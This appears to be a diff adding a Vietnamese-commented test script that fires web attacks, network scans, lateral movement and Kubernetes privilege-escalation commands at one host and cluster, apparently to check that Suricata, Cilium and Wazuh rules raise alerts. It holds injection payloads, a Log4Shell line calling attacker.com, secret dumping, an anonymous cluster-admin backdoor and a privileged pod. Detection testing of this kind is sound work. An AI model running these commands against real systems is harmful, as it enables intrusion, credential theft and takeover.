@@ -1,0 +1,107 @@
+1. TẤN CÔNG WEB & KHAI THÁC LỖ HỔNG (SURICATA DPI/IPS - LAYER 7)
+
+
+# 1.1. SQL Injection (UNION SELECT, OR 1=1)
+curl -s "http://13.251.225.100/?id=1%20union%20select%201,2,3"
+curl -s "http://13.251.225.100/?username=admin%27%20or%20%271%27=%271"
+
+# 1.2. Path Traversal / Directory Traversal (/etc/passwd, boot.ini)
+curl -s "http://13.251.225.100/etc/passwd"
+curl -s "http://13.251.225.100/../../../../etc/passwd"
+curl -s "http://13.251.225.100/..%2F..%2F..%2Fetc%2Fpasswd"
+
+# 1.3. Cross-Site Scripting (XSS Stored & Reflected)
+curl -s "http://13.251.225.100/?search=%3Cscript%3Ealert(1)%3C/script%3E"
+curl -s "http://13.251.225.100/?q=%3Cimg%20src=x%20onerror=alert(1)%3E"
+
+# 1.4. Thăm dò file cấu hình và mã nguồn nhạy cảm
+curl -s "http://13.251.225.100/.env"
+curl -s "http://13.251.225.100/.git/config"
+curl -s "http://13.251.225.100/.aws/credentials"
+curl -s "http://13.251.225.100/wp-config.php"
+
+# 1.5. Command Injection Probe (OS Command Execution)
+curl -s "http://13.251.225.100/?cmd=%3Bid"
+curl -s "http://13.251.225.100/?ip=127.0.0.1%7Ccat%20/etc/passwd"
+
+# 1.6. Thăm dò lỗ hổng Log4Shell (Apache Log4j JNDI)
+curl -s -H 'User-Agent: ${jndi:ldap://attacker.com/exploit}' "http://13.251.225.100/"
+
+# 1.7. Quét thăm dò tự động bằng Scanner (User-Agent Blacklist)
+curl -A "sqlmap/1.6" -s "http://13.251.225.100/"
+curl -A "Nikto/2.1.6" -s "http://13.251.225.100/"
+curl -A "gobuster/3.1.0" -s "http://13.251.225.100/"
+curl -A "DirBuster-1.0-RC1" -s "http://13.251.225.100/"
+curl -A "masscan/1.3" -s "http://13.251.225.100/"
+
+# 1.8. Thử phương thức HTTP nguy hiểm (HTTP Method Tampering)
+curl -X TRACE "http://13.251.225.100/"
+curl -X PUT -d "test" "http://13.251.225.100/shell.php"
+
+
+
+2. TẤN CÔNG THĂM DÒ MẠNG & RECONNAISSANCE (SURICATA - LAYER 4)
+
+# 2.1. Quét cổng TCP SYN (Nmap Stealth Scan)
+nmap -sS -p 80,443,7443,8443 13.251.225.100
+
+# 2.2. Quét toàn dải cổng tốc độ cao (Fast Scan)
+nmap -F -sS 13.251.225.100
+
+# 2.3. Quét nhận diện phiên bản OS và Dịch vụ (OS & Service Fingerprinting)
+nmap -sV -O -p 80,443 13.251.225.100
+
+# 2.4. Gửi chuỗi gói tin SYN liên tục thăm dò cổng (SYN Flood / Scan)
+for i in {1..35}; do nc -z -v -w 1 13.251.225.100 8443 & done
+
+
+3. TẤN CÔNG DI CHUYỂN NGANG & VI PHẠM NETWORK POLICY 
+
+# 3.1. Vi phạm Zero-Trust: Từ Pod không được phép cố truy cập vào Payment Service (Cilium DROP)
+ssh -i ~/.ssh/ncs-key.pem -o ProxyCommand="ssh -i ~/.ssh/ncs-key.pem -W %h:%p ubuntu@13.251.225.100" ubuntu@10.0.10.10 "kubectl exec -n online-boutique \$(kubectl get pods -n online-boutique -l app=currencyservice -o jsonpath='{.items[0].metadata.name}') -- nc -zv -w 2 paymentservice 50051"
+
+# 3.2. Cố tình quét cổng nội bộ từ Pod bên trong cụm (Internal Lateral Recon)
+ssh -i ~/.ssh/ncs-key.pem -o ProxyCommand="ssh -i ~/.ssh/ncs-key.pem -W %h:%p ubuntu@13.251.225.100" ubuntu@10.0.10.10 "kubectl exec -n online-boutique \$(kubectl get pods -n online-boutique -l app=frontend -o jsonpath='{.items[0].metadata.name}') -- nc -zv -w 2 10.0.10.10 6443"
+
+# 3.3. Xem log Cilium eBPF trực tiếp bắt và chặn các gói vi phạm NetworkPolicy
+ssh -i ~/.ssh/ncs-key.pem -o ProxyCommand="ssh -i ~/.ssh/ncs-key.pem -W %h:%p ubuntu@13.251.225.100" ubuntu@10.0.10.10 "kubectl -n kube-system exec -ti \$(kubectl get pods -n kube-system -l k8s-app=cilium -o jsonpath='{.items[0].metadata.name}') -- cilium monitor --type drop"
+
+
+4. TẤN CÔNG & LEO THANG ĐẶC QUYỀN KUBERNETES 
+
+# 4.1. Đọc trộm Secret nhạy cảm trong hệ thống (Credential Access - Rule 110003)
+ssh -i ~/.ssh/ncs-key.pem -o ProxyCommand="ssh -i ~/.ssh/ncs-key.pem -W %h:%p ubuntu@13.251.225.100" ubuntu@10.0.10.10 "kubectl get secrets -n kube-system"
+ssh -i ~/.ssh/ncs-key.pem -o ProxyCommand="ssh -i ~/.ssh/ncs-key.pem -W %h:%p ubuntu@13.251.225.100" ubuntu@10.0.10.10 "kubectl get secrets -n online-boutique"
+
+# 4.2. Mở shell tương tác / Container Exec vào bên trong Pod (Execution - Rule 110004)
+ssh -i ~/.ssh/ncs-key.pem -o ProxyCommand="ssh -i ~/.ssh/ncs-key.pem -W %h:%p ubuntu@13.251.225.100" ubuntu@10.0.10.10 "kubectl exec -n online-boutique \$(kubectl get pods -n online-boutique -l app=frontend -o jsonpath='{.items[0].metadata.name}') -- ls"
+
+# 4.3. Can thiệp sửa đổi quyền RBAC / Tạo backdoor Cluster Admin (Privilege Escalation - Rule 110005)
+ssh -i ~/.ssh/ncs-key.pem -o ProxyCommand="ssh -i ~/.ssh/ncs-key.pem -W %h:%p ubuntu@13.251.225.100" ubuntu@10.0.10.10 "kubectl create clusterrolebinding malicious-admin-binding --clusterrole=cluster-admin --user=system:anonymous"
+
+# 4.4. Xóa tài nguyên quan trọng trong cụm (Impact / Malicious Deletion - Rule 110006)
+ssh -i ~/.ssh/ncs-key.pem -o ProxyCommand="ssh -i ~/.ssh/ncs-key.pem -W %h:%p ubuntu@13.251.225.100" ubuntu@10.0.10.10 "kubectl delete pod -n online-boutique \$(kubectl get pods -n online-boutique -l app=frontend -o jsonpath='{.items[0].metadata.name}')"
+
+# 4.5. Truy cập ẩn danh không xác thực vào K8s API (Anonymous Access - Rule 110007)
+curl -k -s "https://10.0.10.10:6443/api/v1/namespaces"
+
+# 4.6. Tạo Pod đặc quyền leo thang (Privileged Pod / HostPID Escape)
+ssh -i ~/.ssh/ncs-key.pem -o ProxyCommand="ssh -i ~/.ssh/ncs-key.pem -W %h:%p ubuntu@13.251.225.100" ubuntu@10.0.10.10 "kubectl run rogue-pod --image=busybox --restart=Never --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"rogue\",\"image\":\"busybox\",\"securityContext\":{\"privileged\":true}}]}}' -- sleep 3600"
+
+
+
+5. TẤN CÔNG TOÀN VẸN TẬP TIN & HỆ ĐIỀU HÀNH 
+
+
+# 5.1. Sửa đổi tập tin cấu hình hệ thống nhạy cảm (Wazuh FIM Alert)
+ssh -i ~/.ssh/ncs-key.pem ubuntu@13.251.225.100 "echo '# malicious entry' | sudo tee -a /etc/hosts"
+
+# 5.2. Tạo tập tin backdoor ẩn trong thư mục hệ thống
+ssh -i ~/.ssh/ncs-key.pem ubuntu@13.251.225.100 "sudo touch /tmp/.hidden_backdoor.sh"
+
+# 5.3. Leo thang đặc quyền ROOT trên máy chủ Gateway (Sudo su - Rule 5402)
+ssh -i ~/.ssh/ncs-key.pem ubuntu@13.251.225.100 "sudo su -c 'id; whoami'"
+
+# 5.4. Thử đăng nhập sai SSH brute-force (Authentication Failed - Rule 5716)
+ssh -o StrictHostKeyChecking=no -o PasswordAuthentication=yes fakeuser@13.251.225.100
+ssh -o StrictHostKeyChecking=no -o PasswordAuthentication=yes root@13.251.225.100
